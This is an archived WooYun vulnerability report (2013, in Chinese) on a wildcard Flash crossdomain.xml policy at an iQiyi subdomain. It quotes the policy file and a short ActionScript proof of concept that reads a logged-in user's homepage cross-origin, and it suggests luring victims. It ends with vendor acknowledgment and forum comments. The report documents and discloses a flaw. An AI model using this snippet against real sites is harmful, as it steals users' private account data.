{"id": 10233, "wybug_id": "wooyun-2013-028888", "wybug_title": "奇异某分站flash跨域漏洞(带测试实现code)", "wybug_corp": "奇艺", "wybug_author": "Aring", "wybug_date": "2013-07-14 21:52", "wybug_open_date": "2013-08-28 21:52", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "利用技巧", "类型应用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-28：\t细节向公众公开  简要描述： flash跨域策略crossdomain.xml文件限制不严，造成flash csrf。 详细说明：  看crossdomain.xml\n<?xml version=\"1.0\"?>\t\t<cross-domain-policy> <site-control permitted-cross-domain-policies=\"all\" />    <allow-access-from domain=\"*\" />     <allow-http-request-headers-from domain=\"*\" headers=\"*\"/></cross-domain-policy>\n1：permitted-cross-domain-policies为all造成加载目标域上的任何文件作为跨域策略文件，甚至是一 个JPG也可被加载为策略文件！[使用此选项那就等着被xx吧！]2：allow-access-from 设为“*”任何的域，有权限通过flash读取本域中的内容。3：allow-http-request-headers-from header设个“*”允许发送任何消息头。   漏洞证明：  个人首页url：http://i.iqiyi.com/home?lefttitlesign=percenter获取用户用户个人首页信息：\nimport flash.net.*;var mytest:String = \"hello\";var myloader = new URLLoader(new URLRequest(\"http://i.iqiyi.com/home?lefttitlesign=percenter\"));myloader.addEventListener(Event.COMPLETE,test);myloader.load();function test(event:Event){var ResponseText:String = myloader.data;text1.text = ResponseText;stop();}\n\n\n\n\n请求界面自己发挥下,弄点诱惑人的。   修复方案：  crossdomain.xml控制好   版权声明：转载请注明来源 Aring@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-07-14 22:28 厂商回复： 感谢，正在处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-14 21:57 |    \t\tAring \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:15        | 自由共享)\t\t \n  好速度    \n     2013-07-14 22:39 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  我去，我上次提交的115的。。你妹flash跨域加脚本执行。。竟然忽略。。小厂商我真的没有什么要说的了。。    \n     2013-07-16 17:28 |    \t\tcmdshell \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:9        )\t\t \n  我是来看aring的 哈哈    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}